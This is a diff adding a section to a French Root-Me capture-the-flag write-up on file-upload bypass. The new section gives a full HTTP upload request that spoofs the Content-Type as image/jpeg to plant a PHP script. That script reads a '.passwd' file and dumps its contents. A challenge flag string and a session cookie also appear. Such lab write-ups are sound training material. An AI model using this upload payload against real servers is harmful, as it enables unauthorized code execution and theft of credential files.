@@ -231,6 +231,28 @@ Une fois le fichier uploadé, on y accède via l'URL indiquée et celui nous ret
 ```
 string(26) "Gg9LRz-hWSxqqUKd77-_q-6G8 "
 ```
+
+## 14. File upload - type MIME
+
+Comme le titre l'indique, il est possible que le programme en PHP vérifie le type MIME donc le type Content-Type des fichiers. Donc nous allons simplement fait croire au serveur que notre fichier est une image en hors ce sera un script PHP.
+
+```text
+POST http://challenge01.root-me.org/web-serveur/ch21/?action=upload
+Cookie: PHPSESSID=p3f7lp9lntnqn78lk5j5iajv40
+Content-Length: 249
+Content-Type: multipart/form-data; boundary=15a2b44ada445e9c2ed219355b04907a
+
+--15a2b44ada445e9c2ed219355b04907a
+Content-Disposition: form-data; name="file"; filename="rstasrtrast.php"
+Content-Type: image/jpeg
+
+<?php
+$file = file_get_contents('../../../.passwd');
+var_dump($file);
+?>
+--15a2b44ada445e9c2ed219355b04907a--
+```
+
 ## 15. HTTP Cookies
 
 On renseigne dans un premier temps son adresse mail dans le formulaire puis on essaie d'accéder à la liste des mails sauvegardés. Un message d'erreur s'affiche alors en nous indiquant que nous ne sommes pas admin: `You need to be admin `
